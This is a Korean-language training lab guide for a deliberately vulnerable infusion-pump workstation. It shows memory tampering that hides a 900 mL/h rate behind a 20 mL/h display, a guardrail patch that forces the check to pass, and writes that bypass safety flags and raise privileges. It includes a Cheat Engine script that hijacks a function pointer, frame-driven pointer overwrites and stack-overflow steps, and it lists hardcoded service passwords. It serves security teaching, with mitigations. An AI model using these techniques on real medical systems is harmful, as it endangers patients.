# CANnula Workstation — Cheat Engine 실습 (메모리 조작 · 코드 주입)

> ⚠ **인가된 실습 환경에서만.** 실제 의료기기·환자·병원 네트워크 금지.
> 이 문서는 "안전-크리티컬 값이 보호 없는 프로세스 메모리에 있으면 무슨 일이
> 벌어지는가" 를 직접 보게 하는 것이 목적입니다.

## 0. 왜 이 대상인가

워크스테이션은 프로세스가 둘입니다.

| 프로세스 | 무엇이 들어 있나 | 실습 난이도 |
|---|---|---|
| **`CANnulaBridge.exe`** | CAN 프레임 파서, 펌프 상태, DERS 상한, 안전 인터록, 권한 레벨, 프레임 핸들러 테이블 — 모두 네이티브 C 전역 변수 | 주 대상. 구조가 단순하고 주소가 고정 |
| `CANnula-Workstation-WEAK.exe` (Electron) | 화면, 세션, 환자 정보 — V8 힙 객체 | 보조 대상. 힙이 움직여서 값 고정이 어렵다 |

**게이트웨이 프로세스에 붙습니다.** 안전 판정이 거기서 일어나기 때문입니다.

빌드는 보호 기능이 꺼진 상태입니다 (`native/build.bat`):

- `-fno-stack-protector` — 스택 카나리 없음
- `--disable-dynamicbase` — **ASLR 없음.** 실행마다 주소가 같다
- `--disable-nxcompat` — **DEP 없음.** 데이터 영역 코드가 실행된다
- `-O0 -g` — 최적화 없음, 심볼 있음
- 고정 이미지 베이스: `cannula_can.dll` → `0x180000000`, `CANnulaBridge.exe` → `0x140000000`

## 1. 준비

1. 게이트웨이와 앱을 띄운다 (`npm start` 하면 게이트웨이가 함께 뜬다).
   기본 전송은 `slcan` 이라 어댑터와 펌프가 필요하다. 하드웨어 없이 하려면
   **설정** 에서 시뮬레이터로 바꾼다 — 이 실습은 어느 쪽이든 결과가 같다.
2. 앱에서 **주입 설정** → 속도 20 mL/h, VTBI 500 mL 로 전송하고 **주입 시작**.
   대시보드에 값이 흐르는 것을 확인한다.
3. Cheat Engine 을 **관리자 권한으로** 실행하고 프로세스 목록에서
   `CANnulaBridge.exe` 를 연다.
4. 주소를 확보한다. 세 가지 길이 있다.

   **(a) 아래 주소표를 그대로 쓴다** — ASLR 이 꺼져 있고 이미지 베이스가 고정이라
   배포된 `cannula_can.dll` 의 전역 변수 주소는 **실행마다 같습니다.**
   (아래 표는 `dist/` 에 들어간 실제 빌드에서 뽑은 값입니다.)

   **(b) 자가진단 출력** — 게이트웨이가 진단용으로 구조체 주소를 찍습니다:
   ```
   > CANnulaBridge.exe --selftest
   engine: CANnula CAN Engine 1.2.0 (weak-training)
   state : 0000000180016020  (+0x00 rate, +0x16 ders_hard_max, +0x1A safety_bypassed)
   ctx   : 0000000180016060  (+0x00 resp_buf[64], +0x48 handlers[12])
   status: OK
   ```
   (제품이 자기 메모리 배치를 알려 주는 것 자체가 취약점입니다 — `VULNERABILITIES.md` 8.)

   **(c) 값 스캔** — 아래 시나리오 A 의 절차. 소스를 고쳐 다시 빌드하면 표의 주소가
   어긋나므로, 그때는 이 방법이나 `objdump -t cannula_can.dll` 로 다시 구합니다.

5. CE 주소 입력란에는 `cannula_can.dll+<오프셋>` 형태도 쓸 수 있습니다.
   절대 주소에서 모듈 베이스(`0x180000000`)를 빼면 오프셋입니다.

### 배포 빌드의 실제 주소

| 심볼 | 섹션 | 절대 주소 | 내용 |
|---|---|---|---|
| `g_ws` | `.bss` | `0x180016020` | 표시 + 안전 판정 상태 (`ws_state_t`, 0x30) |
| `g_can` | `.bss` | `0x180016060` | 재조립 버퍼 + 핸들러 테이블 (`can_ctx_t`, 0xE0) |
| `g_last_line` | `.bss` | `0x180016140` | 마지막 표시 문자열 |
| `g_service_password` | `.data` | `0x180011020` | `"svc123"` |
| `g_override_code` | `.data` | `0x180011030` | `"OVERRIDE"` |
| `g_device_id` | `.data` | `0x180011040` | 장치 식별자 |
| `g_alarm_labels` | `.data` | `0x180011080` | 알람 라벨 포인터 배열 (10칸) |
| `g_drugs` | `.rdata` | `0x180012000` | 약물 테이블 (6칸) |

바로 쓸 수 있는 필드 주소:

| 필드 | 주소 | 형 |
|---|---|---|
| `g_ws.rate_mlh` (실제 속도) | `0x180016020` | 2 Bytes |
| `g_ws.rate_display` (표시 속도) | `0x180016022` | 2 Bytes |
| `g_ws.rate_setpoint` | `0x180016024` | 2 Bytes |
| `g_ws.ders_enabled` | `0x180016033` | Byte |
| `g_ws.ders_soft_max` | `0x180016034` | 2 Bytes |
| `g_ws.ders_hard_max` | `0x180016036` | 2 Bytes |
| `g_ws.safety_bypassed` | `0x18001603A` | Byte |
| `g_ws.auth_level` | `0x18001603B` | Byte |
| `g_can.resp_buf` | `0x180016060` | Array of byte[64] |
| `g_can.resp_off` | `0x1800160A0` | 4 Bytes |
| `g_can.handlers[0]` → 0x200 TELEMETRY | `0x1800160A8` | 8 Bytes |
| `g_can.handlers[1]` → 0x201 ALARM_EVENT | `0x1800160B0` | 8 Bytes |
| `g_can.handlers[2]` → 0x202 STATUS | `0x1800160B8` | 8 Bytes |
| `g_can.handlers[3]` → 0x203 DEBUG_RESPONSE | `0x1800160C0` | 8 Bytes |
| `g_can.handlers[4]` → 0x300 MEMORY_DUMP | `0x1800160C8` | 8 Bytes |

> `CANnulaBridge.exe` 자체의 이미지 베이스는 `0x140000000` 이고 `DllCharacteristics`
> 가 `0x0000` 입니다 — ASLR·DEP 플래그가 모두 꺼져 있다는 뜻입니다.
> 확인: `objdump -p CANnulaBridge.exe | grep -E "ImageBase|DllCharacteristics"`

## 2. 메모리 지도

### `ws_state_t g_ws` — 표시 + 안전 판정 상태 (크기 `0x30`)

| 오프셋 | 형 | 필드 | 의미 |
|---|---|---|---|
| `+0x00` | u16 | `rate_mlh` | **실제** 주입 속도 (텔레메트리에서 갱신) |
| `+0x02` | u16 | `rate_display` | **화면에 뜨는** 속도 (UI 가 읽는 값) |
| `+0x04` | u16 | `rate_setpoint` | 임상의 지시 속도 |
| `+0x06` | u16 | `vtbi_ml` | 총 주입 예정량 |
| `+0x08` | u16 | `volume_infused` | 누적 주입량 |
| `+0x0A` | u16 | `volume_remaining` | 잔량 |
| `+0x0C` | u16 | `drug_id` | 약물 ID (배열 인덱스로 쓰인다) |
| `+0x0E` | u8 | `patient_weight` | 체중 kg |
| `+0x0F` | u8 | `battery_percent` | 배터리 |
| `+0x10` | u8 | `alarm_code` | 알람 코드 (배열 인덱스로 쓰인다) |
| `+0x11` | u8 | `pump_state` | 0 대기 / 1 주입 / 2 정지 / 3 알람 / 4 서비스 / 5 부트로더 |
| `+0x12` | u8 | `alarm_silenced` | 무음화 |
| `+0x13` | u8 | `ders_enabled` | **가드레일 활성** |
| `+0x14` | u16 | `ders_soft_max` | 경고 상한 mL/h |
| `+0x16` | u16 | `ders_hard_max` | **절대 상한 mL/h** |
| `+0x18` | u16 | `ders_hard_min` | 하한 |
| `+0x1A` | u8 | `safety_bypassed` | **안전 인터록 우회** |
| `+0x1B` | u8 | `auth_level` | **권한 (0 없음 / 1 간호사 / 2 기사·관리자)** |
| `+0x1C` | u32 | `dose_mcg_kg_min` | 계산된 용량 |
| `+0x20` | u32 | `frames_rx` | 수신 프레임 수 |
| `+0x24` | u32 | `frames_tx` | 송신 프레임 수 |
| `+0x28` | u32 | `last_rx_ms` | |
| `+0x2C` | u32 | `bus_errors` | |

### `can_ctx_t g_can` — 재조립 버퍼 + 핸들러 테이블 (크기 `0xE0`)

| 오프셋 | 형 | 필드 |
|---|---|---|
| `+0x00` | char[64] | `resp_buf` — 0x203 서비스 응답 재조립 버퍼 |
| `+0x40` | u32 | `resp_off` — 다음 쓰기 위치 (상한 검사 없음) |
| `+0x44` | u32 | `resp_len` |
| `+0x48` | ptr[12] | **`handlers`** — 프레임 ID 별 핸들러 함수 포인터 |
| `+0xA8` | u32[12] | `handler_ids` — 각 슬롯이 담당하는 CAN ID |
| `+0xD8` | u32 | `handler_count` |

핸들러 등록 순서 (`can_engine_init`):

| 슬롯 | 주소 | 담당 ID |
|---|---|---|
| `handlers[0]` | `g_can+0x48` | `0x200` TELEMETRY (1초마다 호출) |
| `handlers[1]` | `g_can+0x50` | `0x201` ALARM_EVENT |
| `handlers[2]` | `g_can+0x58` | `0x202` STATUS |
| `handlers[3]` | `g_can+0x60` | `0x203` DEBUG_RESPONSE |
| `handlers[4]` | `g_can+0x68` | `0x300` MEMORY_DUMP |

### 문자열 (같은 `.data`, `strings` 로도 보인다)

`g_service_password` = `svc123`, `g_override_code` = `OVERRIDE`,
`g_device_id`, 그리고 시뮬레이터의 "플래시 이미지"(`ADMIN_PASSWORD=admin123`,
`OTA_KEY=...` 등).

---

## 시나리오 A — 화면만 안전하게 보이게 (표시 조작)

**목표**: 실제 주입 속도는 900 mL/h 인데 대시보드에는 20 mL/h 로 보이게 한다.

이 랩에서 가장 임상적으로 위험한 조작입니다. 값을 바꾸는 것이 아니라
**감시자의 눈을 속이는 것**이기 때문입니다.

1. 앱에서 속도 20 mL/h 로 주입 중인 상태를 만든다.
2. CE 에서 `2 Bytes` 형으로 `20` 을 스캔한다. 후보가 여러 개 나온다.
   (주소표를 바로 써도 되지만, 스캔으로 찾는 절차 자체가 실습의 일부다.)
3. 앱에서 속도를 25 로 바꾸고 `Next Scan` 에 `25` 를 넣는다. 두어 번 반복하면
   `rate_mlh`(+0x00)와 `rate_display`(+0x02)가 **인접한 두 주소**로 남는다.
   낮은 주소가 실제 값, 4바이트 뒤가 지시값(`rate_setpoint`)이다.
4. `rate_display` 를 20 으로 써넣고 **Active(freeze)** 체크박스를 켠다.
5. 이제 속도를 900 으로 지시한다. 확인할 것:
   - 대시보드 큰 숫자: 20 으로 고정되어 있는가
   - 하단 상태 줄(`statusLine`): 무엇을 보여 주는가 — 이 줄은 네이티브에서
     `rate_mlh` 로 만들어진다
   - 속도 그래프: 어떤 값을 그리는가 (`applyState` 가 무엇을 push 하는지 확인)
   - 볼륨 진행 바와 잔량: 실제 주입 속도를 반영하는가
6. **생각할 것**: 표시 값 하나를 고정했는데 다른 지표가 어긋나 들통난다.
   완전한 은폐를 위해 무엇을 더 고정해야 하는가? 그리고 그 사실이
   "표시 값과 판정 값을 한 구조체에 두면 안 되는" 이유를 어떻게 설명하는가?

**대응 (설계 관점)**: 화면에 뿌리는 값과 안전 판정에 쓰는 값을 분리하고,
표시 경로는 장치가 서명한 값을 그대로 보여 주게 한다. 값 이중 저장 + 주기적
교차 검증.

---

## 시나리오 B — 가드레일 코드 패치

**목표**: DERS 판정 함수가 항상 통과하도록 코드를 고친다.

`can_ders_check()` 는 **DLL 에서 이름으로 내보내집니다** (`native/cannula_can.h`).
그래서 찾기가 쉽습니다.

1. x64dbg 로 `CANnulaBridge.exe` 에 붙고, `cannula_can.dll` 의 심볼 목록에서
   `can_ders_check` 를 찾는다. (CE 만 쓰려면 메모리 뷰어에서 절대 주소로 이동한다.)
2. 함수 앞부분을 읽는다. 소스 구조는 이렇다:
   ```c
   g_ws.rate_setpoint = rate_mlh;      /* 판정 전에 이미 반영된다 */
   ...
   if (g_ws.safety_bypassed) return 1;
   if (!g_ws.ders_enabled)   return 1;
   if (rate_mlh > g_ws.ders_hard_max) { g_ws.alarm_code = 5; return 0; }
   if (rate_mlh > g_ws.ders_soft_max) { return 1; }
   return 1;
   ```
3. `ders_hard_max` 비교 뒤의 조건 분기를 찾아 반대로 만든다 (`ja` → `jmp` 로 덮거나
   비교 자체를 `nop` 으로 지운다). 또는 함수 첫 바이트를
   `mov eax,1 / ret` (`B8 01 00 00 00 C3`) 로 덮어 즉시 통과시킨다.
4. 앱에서 속도 5000 mL/h 를 지시해 본다. 판정 문자열이 어떻게 바뀌는가.
5. **주의**: 함수 첫 바이트를 덮으면 `rate_setpoint`/`dose` 갱신도 사라진다.
   화면에 그 흔적이 남는지 확인하라. "가장 조용한 패치" 는 어느 것인가?

**생각할 것**: 앱 화면의 판정과 실제 버스로 나가는 프레임이 이미 분리되어 있다
(`VULNERABILITIES.md` 3). 코드 패치 없이도 같은 결과가 나오는 경로가 있는데,
그렇다면 코드 패치는 무엇을 추가로 얻는가?

---

## 시나리오 C — 안전 플래그 · 권한 직접 쓰기

**목표**: 인터록을 내리고 상한을 없애고 권한을 올린다.

시나리오 A 에서 `g_ws` 베이스를 이미 알고 있습니다. CE 주소 목록에
직접 항목을 추가하세요 (`Add Address Manually`).

| 주소 | 형 | 쓸 값 | 효과 |
|---|---|---|---|
| `g_ws+0x1A` | Byte | `1` | `safety_bypassed` — DERS 판정이 즉시 통과 |
| `g_ws+0x13` | Byte | `0` | `ders_enabled` — 가드레일 자체를 끈다 |
| `g_ws+0x16` | 2 Bytes | `65535` | `ders_hard_max` — 절대 상한 제거 |
| `g_ws+0x1B` | Byte | `2` | `auth_level` — 기사/관리자 |
| `g_ws+0x12` | Byte | `1` | `alarm_silenced` |
| `g_ws+0x10` | Byte | `0` | `alarm_code` — 알람 표시 제거 (freeze 하면 계속 지워진다) |

각 값을 바꾼 뒤 앱의 **대시보드 → 가드레일(DERS)** 블록과 **주입 설정** 화면의
판정 문자열을 확인하세요.

**비교해 볼 것**: 같은 결과를 CAN 프레임으로도 낼 수 있습니다 —
`0x202` STATUS 프레임의 바이트 2/3 이 `ders_enabled` / `safety_bypassed` 를
그대로 덮습니다 (`HACKING_SCENARIOS.md` 시나리오 2). 메모리 쓰기와 프레임 위조 중
어느 쪽이 탐지하기 어려운가?

---

## 시나리오 D — 코드 주입: CAN 프레임이 방아쇠를 당긴다 ⭐

**목표**: 우리가 메모리에 올린 코드를, **버스에서 들어온 CAN 프레임이 실행하게**
만든다.

프레임 처리가 쓰기 가능한 함수 포인터 테이블을 경유하기 때문에 성립합니다.

### D-1. 코드를 심고 포인터를 CE 로 바꾼다

CE 의 **Memory View → Tools → Auto Assemble** 에 아래 스크립트를 넣습니다.
`WS` / `CTX` 는 `--selftest` 로 얻은 주소로 바꿉니다.

```
// CANnula 실습 — 주입한 코드가 0x200 프레임에서 실행되는지 확인한다.
// handlers[0] (= CTX+0x48) 이 원래 h_telemetry 를 가리킨다. 그것을 우리 스텁으로
// 바꾸고, 스텁은 안전 플래그를 내린 뒤 원래 핸들러로 이어 준다.
//
// Windows x64 호출 규약: 첫 인자(const can_frame_t *f)는 RCX 에 온다.

define(WS,  180016020)     // g_ws  (--selftest 의 state 주소와 같아야 한다)
define(CTX, 180016060)     // g_can (--selftest 의 ctx 주소와 같아야 한다)

[ENABLE]
alloc(stub,1000)
alloc(origHandler,8)
alloc(hitCount,8)
label(stubEntry)
registersymbol(stub)
registersymbol(origHandler)
registersymbol(hitCount)

// 원래 핸들러 주소를 보관한다 (복구용 + 체이닝용)
origHandler:
  dq 0

hitCount:
  dq 0

stub:
stubEntry:
  push rax
  // 이 코드가 실행됐다는 증거를 남긴다
  mov rax,[hitCount]
  add rax,1
  mov [hitCount],rax
  // 안전 인터록을 내리고 권한을 올린다
  mov rax,WS
  mov byte ptr [rax+1A],1
  mov byte ptr [rax+1B],2
  pop rax
  // 원래 핸들러로 이어 준다 → 화면은 정상으로 계속 갱신된다
  jmp qword ptr [origHandler]

// handlers[0] 을 우리 스텁으로 바꾼다
{$lua}
if syntaxcheck then return end
local ctx = 0x180016060                    -- CTX 와 같은 값
local orig = readQword(ctx + 0x48)
writeQword(getAddress("origHandler"), orig)
writeQword(ctx + 0x48, getAddress("stub"))
print(string.format("handlers[0]: %X -> %X", orig, getAddress("stub")))
{$asm}

[DISABLE]
{$lua}
if syntaxcheck then return end
local ctx = 0x180016060                    -- CTX 와 같은 값
local orig = readQword(getAddress("origHandler"))
if orig ~= 0 then writeQword(ctx + 0x48, orig) end
{$asm}
unregistersymbol(stub)
unregistersymbol(origHandler)
unregistersymbol(hitCount)
dealloc(stub)
dealloc(origHandler)
dealloc(hitCount)
```

확인할 것:

1. 스크립트를 Enable 한다.
2. **아무 것도 하지 않고 기다린다.** 펌프가 1초마다 `0x200` 텔레메트리를 보내므로,
   1초 안에 우리 스텁이 실행된다.
3. CE 주소 목록에 `hitCount` 를 추가한다 (8 Bytes). 1초마다 올라가는가?
4. 앱의 **대시보드 → 가드레일** 을 본다. `안전 인터록: 우회됨`,
   `권한 레벨: 2` 로 바뀌었는가? 그런데 **화면의 다른 값은 정상적으로 계속 갱신되는가?**
   (스텁이 원래 핸들러로 이어 주기 때문이다 — 이것이 탐지 회피의 핵심이다)
5. DEP 가 꺼져 있기 때문에 CE 가 할당한 페이지의 코드가 그냥 실행된다는 점을
   확인한다. `--disable-nxcompat` 을 빼고 다시 빌드하면 어떻게 되는가?

### D-2. 포인터까지 CAN 프레임으로 바꾼다 (조합)

여기가 이 랩의 정점입니다. CE 는 **코드를 심는 데만** 쓰고, **포인터 덮어쓰기는
버스에서** 합니다.

1. D-1 의 스크립트에서 `{$lua}` 블록(포인터 교체)을 지우고, `alloc` 과 스텁만 남긴다.
   Enable 한 뒤 CE 가 알려 주는 `stub` 주소를 적어 둔다 (예: `0x2A0000`).
   ASLR 이 없으니 이 주소는 재현 가능한 범위에서 안정적이다.
2. 이제 `HACKING_SCENARIOS.md` 시나리오 5b 의 절차를 CAN 프레임으로 수행한다:
   - `0x203` 프레임 하나(`data[0]=0x00`)로 재조립 버퍼를 초기화
   - 8바이트 프레임 8개로 `resp_off` 를 64 로 만든다
   - `resp_off` 자체를 덮어 쓰기 위치를 `handlers[0]`(`+0x48`)로 옮긴다
     — `resp_off += dlc` 가 뒤따르는 것을 계산에 넣는다
   - 다음 프레임 8바이트에 `stub` 주소(리틀 엔디언)를 실어 보낸다
3. 그 뒤 `0x200` 프레임 하나. `hitCount` 가 올라가는가?

**이것이 무슨 의미인가**: 공격자가 프로세스 메모리에 붙을 수 없더라도,
**CAN 버스에 프레임을 흘릴 수 있으면 워크스테이션의 제어 흐름을 가져올 수 있다.**
CE 는 여기서 "실행 가능한 페이지를 준비하는 도구" 역할만 했고, 실제 트리거는
의료기기 통신 경로였습니다. 실전에서는 그 페이지조차 프레임으로 채우거나
(DEP 가 없으므로 `resp_buf` 자체에 코드를 올려도 된다) 기존 코드 조각을
재사용합니다.

**실증 결과**: `handlers[0]` 을 유효하지 않은 값(`0x4141414141414141`)으로 덮고
`0x200` 을 보내면 게이트웨이 프로세스가 즉시 죽습니다. 즉 제어 전달이
실제로 일어납니다.

---

## 시나리오 E — 스택 오버플로 분석 (CE + x64dbg)

**목표**: 원격 제어 포트의 스택 오버플로 오프셋을 찾는다.

`VULNERABILITIES.md` 10 — `jget_str()` 이 JSON 문자열을 길이 제한 없이 고정
크기 스택 버퍼에 옮깁니다.

1. 게이트웨이에 디버거를 붙인다.
2. 제어 포트(47100)에 `{"op":"override","code":"AAAA...."}` 를 보낸다.
   길이를 늘려 가며 어디에서 예외가 나는지 본다.
3. 예외 시점에 CE 의 **Memory View** 로 스택을 본다. 리턴 주소가 어느 오프셋에
   있는가? 카나리가 없다는 것을 확인한다.
4. 이미지 베이스가 고정(`0x140000000`)이라는 점을 확인한다. 재실행해도
   같은 주소인가?
5. DEP 가 없으므로 스택에 올린 바이트로 바로 점프할 수 있다. 다만 `jget_str` 이
   `\` 를 이스케이프로 처리하고 `"` 에서 멈추는 것을 계산에 넣어야 한다 —
   어떤 바이트를 쓸 수 없는가?

**대응**: 길이 인자를 받는 파서, `/GS`, `/DYNAMICBASE`, `/NXCOMPAT`.

---

## 시나리오 F — Electron 프로세스 (보조)

메인 대상은 게이트웨이지만, Electron 쪽도 볼 거리가 있습니다.

1. `CANnula-Workstation-WEAK.exe` (또는 개발 중이면 `electron.exe`) 에 붙는다.
   프로세스가 여러 개다 — 렌더러는 `--type=renderer` 인자를 가진 쪽이다.
2. V8 힙에서 문자열을 찾는다. 환자 이름, 세션 사용자 이름, 장치 식별자가
   그대로 있다. 값이 GC 로 움직이기 때문에 freeze 가 잘 안 듣는다 —
   왜 그런지, 네이티브 전역 변수와 무엇이 다른지 설명해 보라.
3. 세션은 파일로도 남는다. `localStorage` 를 찾아 `role` 을 바꾸면 무엇이 열리는가?
   (`VULNERABILITIES.md` 19)
4. 메모리 조작 대신 더 짧은 길이 있다는 것을 확인하라. `nodeIntegration: true`
   인 렌더러에서는 개발자 콘솔 한 줄이 `WriteProcessMemory` 보다 강력하다.

**교육 포인트**: "메모리 조작이 필요한가?" 를 먼저 물어야 한다. 이 앱에서는
많은 경우 필요 없다 — 그것이 이 앱의 더 큰 문제다.

---

## 정리: 무엇이 이 실습을 가능하게 했나

| 조건 | 없앴다면 |
|---|---|
| ASLR 없음 (고정 이미지 베이스) | 주소를 매번 다시 찾아야 하고, 프레임으로 포인터를 쓰는 공격이 훨씬 어려워진다 |
| DEP 없음 | 할당한 데이터 페이지의 코드가 실행되지 않는다 |
| 스택 카나리 없음 | 시나리오 E 가 예외 처리에서 멈춘다 |
| 안전 판정 값이 쓰기 가능한 전역 구조체에 있음 | 시나리오 A/C 가 성립하지 않는다 |
| 함수 포인터 테이블 디스패치 | 시나리오 D 의 방아쇠가 사라진다 (`switch` 면 코드 영역을 고쳐야 한다) |
| 프레임 길이/인덱스 무검증 | 시나리오 D-2 가 성립하지 않는다 |
| 자가진단이 구조체 주소를 출력 | 정찰 단계가 길어진다 |

**핵심 교훈**: 메모리 조작 방어는 "값을 숨기는 것" 이 아니라
**안전 판정을 조작 가능한 곳에서 빼내는 것**입니다. 임상적으로 중요한 판정은
워크스테이션이 아니라 펌프(장치) 쪽에서, 서명된 지시에 대해서만 내려야 합니다.
워크스테이션 메모리는 언제든 조작될 수 있다고 가정해야 합니다.

---

## 대조 실습 — 강화 빌드(0.0.2)에 같은 것을 해 보기

`hardened/` 의 강화 빌드에 위 시나리오를 그대로 시도하고, 어디에서 막히는지
확인하세요. 준비: `hardened/` 에서 `npm start`, CE 로 그쪽
`CANnulaBridge.exe` 에 붙습니다.

| 시나리오 | 강화 빌드에서 무슨 일이 생기나 | 왜 |
|---|---|---|
| 주소표 사용 | **주소가 매번 다르다** | `--dynamicbase --high-entropy-va` (ASLR). `DllCharacteristics = 0x0160` 확인 |
| A. 표시 조작 | 고정할 표시 필드가 없다. 표시 상태(`ws_display_t`)와 판정 상태(`ws_safety_t`)가 분리돼 있고, 판정에 쓰는 값은 화면에 뿌리는 값이 아니다 | 항목 2 수정 |
| B. DERS 코드 패치 | 함수를 고쳐도 상한이 바뀌지 않는다. 한계가 `#define` 으로 `.rdata` 에 있고, 엔진과 **펌프 양쪽에서** 검증한다 | 항목 2·3 수정 + 장치 측 재검증 |
| C. 안전 플래그 쓰기 | 쓰는 순간 체크섬이 깨져 **가드레일 켜짐 + 권한 0** 으로 떨어진다. 대시보드에 "안전 상태 무결성: 실패" 가 뜬다 | `safety_valid()` / `safety_fail_closed()` |
| D. 핸들러 테이블 하이재킹 | **테이블이 없다.** 디스패치가 `switch` 다. 게다가 `resp_buf` 오버플로 자체가 성립하지 않는다 | 항목 1 수정 |
| D-2. 프레임으로 포인터 쓰기 | 위조 프레임은 MAC 검증에서 폐기된다. 대시보드의 "MAC 불일치" 수만 올라간다 | CANnula-SEC v1 |
| E. 제어 포트 오버플로 | 토큰 없이는 명령이 파싱되지도 않고, 파서가 용량을 받으며, 카나리가 있다 | 항목 9·10·8 수정 |
| F. Electron 프로세스 | 렌더러에 `require` 가 없다. 개발자 콘솔로 할 수 있는 일이 거의 없다 | 항목 12 수정 |

그리고 **강화 빌드에서도 여전히 되는 것**을 찾아보세요. 힌트는
`hardened/README.md` 의 "남아 있는 한계" 에 있습니다 —
안전 체크섬이 암호학적이지 않다는 점, CAN 키가 파일에 있다는 점, 가용성은
지켜지지 않는다는 점.

이 대조가 이 랩의 결론입니다: **하드닝은 공격을 어렵고 시끄럽게 만들지만,
"메모리를 조작할 수 있는 공격자" 자체를 없애지는 못합니다.** 그래서 안전
판정의 최종 권한은 장치에 있어야 합니다.

## 참고

- 취약점 코드 위치: `VULNERABILITIES.md`
- CAN 프레임 시나리오: `HACKING_SCENARIOS.md`
- 구조체 정의: `native/cannula_can.h`
- 빌드 플래그: `native/build.bat`
- 도구: Cheat Engine, x64dbg, WinDbg, Ghidra, `strings`, Process Hacker
